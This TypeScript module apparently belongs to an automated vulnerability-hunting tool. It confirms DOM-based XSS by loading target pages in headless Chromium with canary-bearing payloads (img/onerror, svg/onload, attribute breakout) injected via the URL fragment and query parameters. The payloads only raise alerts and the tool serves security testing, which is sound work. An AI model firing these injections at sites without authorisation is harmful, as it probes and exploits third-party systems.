// Headless DOM-XSS confirmation (web2-vuln-classes SKILL §3, confirmation stage).
//
// EPISTEMIC HONESTY is the whole point. The static pass in xss.ts records every
// DOM sink at confidence CANDIDATE and never claims execution — a sink appearing
// in client code is a lead, not a proof. This module is the ONLY place allowed to
// move a DOM-XSS finding to PROVEN, and it does so on exactly one condition: we
// drove an attacker-controllable source and watched real JavaScript execute in a
// headless Chromium (an alert()/confirm()/prompt() dialog carrying our unique
// canary). No dialog → confirmed:false with an explicit reason. We never infer
// execution from a reflection, a console line, or the mere presence of the sink.
//
// This is best-effort: we cannot know the exact source→sink wiring from a static
// grep, so we try the sources DOM sinks most commonly read from (location.hash
// and a query param) with a handful of breakout payloads. A false (not confirmed)
// here means "could not prove it anonymously within the budget", NOT "safe".
//
// Hard operational constraints (Agent K's containerized Chromium):
//   - launch with --no-sandbox (no in-container sandbox) + --disable-dev-shm-usage
//   - the browser binary lives at PLAYWRIGHT_BROWSERS_PATH=/ms-playwright; Playwright
//     reads that from the environment, so it is never hardcoded here
//   - the whole confirmation is bounded to ~12s and NEVER throws: a failure in the
//     confirmer must never crash the hunt.

import {
  chromium,
  type Browser,
  type BrowserContext,
  type Dialog,
  type Page,
} from "playwright-chromium";

/** Overall wall-clock budget for one confirmXssSink() call, including launch. */
const OVERALL_DEADLINE_MS = 12_000;
/** Per-navigation page-load cap (further clamped by the remaining budget). */
const PAGE_LOAD_TIMEOUT_MS = 9_000;
/** Grace window after load for an async onerror/onload to fire the dialog. */
const DIALOG_GRACE_MS = 1_500;
/** Below this remaining budget there is no point starting another navigation. */
const MIN_CANDIDATE_BUDGET_MS = 1_500;

/** Chromium launch args required by the container (see header). */
const LAUNCH_ARGS = ["--no-sandbox", "--disable-dev-shm-usage"] as const;

export interface XssSinkInfo {
  /** Sink name exactly as xss.ts recorded it (e.g. 'innerHTML =', 'location sink'). */
  sink: string;
  /** Where the sink was found (JS file URL), carried through for the note. */
  location?: string;
  /** Optional caller-supplied canary id; one is generated when absent. */
  canaryId?: string;
}

export interface XssConfirmResult {
  confirmed: boolean;
  evidence?: string;
  reason?: string;
}

interface Candidate {
  /** The fully-built URL to navigate to. */
  url: string;
  /** Human description of the source we drove (for the evidence string). */
  via: string;
}

/**
 * Build the candidate URLs to try, injecting the canary payload through the
 * sources DOM sinks most commonly read from. We cannot know the real wiring, so
 * this is a prioritized best-effort list; the deadline decides how many we reach.
 */
function buildCandidates(url: string, canaryId: string): Candidate[] {
  const candidates: Candidate[] = [];

  // alert(canaryId) is the execution proof. The canary is single-quoted so it
  // survives inside the payloads below without extra escaping.
  const imgPayload = `<img src=x onerror=alert('${canaryId}')>`;
  const svgPayload = `<svg onload=alert('${canaryId}')>`;
  const breakoutPayload = `"><img src=x onerror=alert('${canaryId}')>`;

  // location.hash variants. The fragment is appended RAW (not via URL encoding):
  // DOM sinks read location.hash and browsers hand most of these bytes back
  // verbatim, so a raw fragment is what actually reaches an innerHTML/doc.write
  // style sink. We strip any existing fragment first.
  let base: string;
  try {
    const u = new URL(url);
    u.hash = "";
    base = u.toString();
  } catch {
    base = url;
  }
  candidates.push({
    url: `${base}#${imgPayload}`,
    via: "location.hash (img/onerror)",
  });
  candidates.push({
    url: `${base}#${svgPayload}`,
    via: "location.hash (svg/onload)",
  });

  // Query-parameter variant — reuse an existing param if the URL has one,
  // otherwise fall back to a common search param name. Here URL encoding is fine:
  // a server/JS reading the param decodes it before it reaches the sink.
  try {
    const u = new URL(url);
    const existing = [...u.searchParams.keys()];
    const key = existing[0] ?? "q";
    u.searchParams.set(key, imgPayload);
    candidates.push({
      url: u.toString(),
      via: `query param "${key}" (img/onerror)`,
    });
  } catch {
    /* unparseable URL — hash candidates still cover the common case */
  }

  // Attribute-breakout via hash, last: useful when the sink drops the fragment
  // inside an existing attribute context.
  candidates.push({
    url: `${base}#${breakoutPayload}`,
    via: "location.hash (attribute breakout)",
  });

  return candidates;
}

/**
 * Load one candidate URL in a fresh page and wait, within `budgetMs`, for a
 * dialog carrying the canary. Returns the dialog message on real execution, or a
 * short failure reason. Never throws.
 */
async function tryCandidate(
  context: BrowserContext,
  candidate: Candidate,
  canaryId: string,
  budgetMs: number,
): Promise<{ fired: true; message: string } | { fired: false; reason: string }> {
  let page: Page | null = null;
  let firedMessage: string | null = null;

  try {
    page = await context.newPage();

    // A dialog whose message contains our canary is unforgeable proof that the
    // injected JavaScript ran. We always dismiss it so the page never blocks.
    page.on("dialog", (dialog: Dialog) => {
      const message = dialog.message();
      void dialog.dismiss().catch(() => {});
      if (firedMessage === null && message.includes(canaryId)) {
        firedMessage = message;
      }
    });

    const navTimeout = Math.max(
      500,
      Math.min(PAGE_LOAD_TIMEOUT_MS, budgetMs - DIALOG_GRACE_MS),
    );

    let navStatus: number | null = null;
    let navError: string | null = null;
    try {
      const resp = await page.goto(candidate.url, {
        waitUntil: "domcontentloaded",
        timeout: navTimeout,
      });
      navStatus = resp ? resp.status() : null;
    } catch (err) {
      navError = err instanceof Error ? err.message : String(err);
    }

    // The dialog may fire during load (sync) or shortly after (async onerror).
    // Poll briefly, bounded by whatever budget remains, resolving the instant it
    // fires.
    const graceMs = Math.max(0, Math.min(DIALOG_GRACE_MS, budgetMs - 200));
    await waitFor(() => firedMessage !== null, graceMs);

    if (firedMessage !== null) {
      return { fired: true, message: firedMessage };
    }
    if (navError) {
      return { fired: false, reason: `page load failed: ${navError}` };
    }
    if (navStatus !== null && navStatus >= 400) {
      return { fired: false, reason: `navigation returned ${navStatus}` };
    }
    return { fired: false, reason: "no dialog/canary observed" };
  } catch (err) {
    return {
      fired: false,
      reason: `candidate errored: ${err instanceof Error ? err.message : String(err)}`,
    };
  } finally {
    if (page) {
      await page.close().catch(() => {});
    }
  }
}

/** Resolve once `predicate()` is true or `timeoutMs` elapses. Never rejects. */
function waitFor(predicate: () => boolean, timeoutMs: number): Promise<void> {
  if (predicate() || timeoutMs <= 0) return Promise.resolve();
  return new Promise<void>((resolve) => {
    const interval = setInterval(() => {
      if (predicate()) {
        clearInterval(interval);
        clearTimeout(timer);
        resolve();
      }
    }, 50);
    const timer = setTimeout(() => {
      clearInterval(interval);
      resolve();
    }, timeoutMs);
  });
}

/**
 * Confirm a DOM-XSS sink by actually executing a canary payload in headless
 * Chromium. Returns confirmed:true ONLY when a dialog carrying the canary fired —
 * real execution. Otherwise confirmed:false with an explicit reason. Never throws.
 */
export async function confirmXssSink(
  url: string,
  sinkInfo: XssSinkInfo,
): Promise<XssConfirmResult> {
  const started = Date.now();
  const deadline = started + OVERALL_DEADLINE_MS;

  // Validate the target up front — a bad URL is a clean, non-throwing failure.
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return { confirmed: false, reason: `invalid URL: ${url}` };
  }
  if (!/^https?:$/.test(parsed.protocol)) {
    return {
      confirmed: false,
      reason: `unsupported scheme "${parsed.protocol}" (only http/https)`,
    };
  }

  const canaryId =
    sinkInfo.canaryId?.trim() || `xssc${Math.random().toString(36).slice(2, 10)}`;
  const candidates = buildCandidates(url, canaryId);

  let browser: Browser | null = null;
  let context: BrowserContext | null = null;

  try {
    // A fresh context per call — no cookies/state shared between targets.
    browser = await chromium.launch({ headless: true, args: [...LAUNCH_ARGS] });
    context = await browser.newContext();

    const confirm = runCandidates(context, candidates, canaryId, sinkInfo, url, deadline);

    // Belt-and-braces overall deadline: even if a candidate somehow hangs past
    // its own timeout, the whole call returns by ~12s. The finally below still
    // tears the browser down, so no Chromium process leaks.
    const overall = new Promise<XssConfirmResult>((resolve) => {
      setTimeout(
        () =>
          resolve({
            confirmed: false,
            reason: `no dialog/canary observed within ${OVERALL_DEADLINE_MS / 1000}s`,
          }),
        Math.max(0, deadline - Date.now()),
      );
    });

    return await Promise.race([confirm, overall]);
  } catch (err) {
    return {
      confirmed: false,
      reason: `browser launch/run failed: ${err instanceof Error ? err.message : String(err)}`,
    };
  } finally {
    if (context) await context.close().catch(() => {});
    if (browser) await browser.close().catch(() => {});
  }
}

/** Walk the candidates in priority order until one fires or the budget runs out. */
async function runCandidates(
  context: BrowserContext,
  candidates: Candidate[],
  canaryId: string,
  sinkInfo: XssSinkInfo,
  originalUrl: string,
  deadline: number,
): Promise<XssConfirmResult> {
  const reasons: string[] = [];
  for (const candidate of candidates) {
    const remaining = deadline - Date.now();
    if (remaining < MIN_CANDIDATE_BUDGET_MS) {
      reasons.push("budget exhausted before all sources tried");
      break;
    }
    const result = await tryCandidate(context, candidate, canaryId, remaining);
    if (result.fired) {
      const where = sinkInfo.location ? ` (sink seen at ${sinkInfo.location})` : "";
      return {
        confirmed: true,
        evidence:
          `alert() fired with canary "${canaryId}" via ${candidate.via} on ${originalUrl} ` +
          `— confirms DOM-XSS sink "${sinkInfo.sink}"${where}. ` +
          `Dialog message: ${result.message}`,
      };
    }
    reasons.push(`${candidate.via}: ${result.reason}`);
  }

  // No execution observed on any source we could reach in time. Report WHY, so
  // the finding stays a CANDIDATE rather than being silently dropped or inflated.
  return {
    confirmed: false,
    reason:
      `no dialog/canary observed within ${OVERALL_DEADLINE_MS / 1000}s for sink ` +
      `"${sinkInfo.sink}" [${reasons.join("; ") || "no candidates attempted"}]`,
  };
}
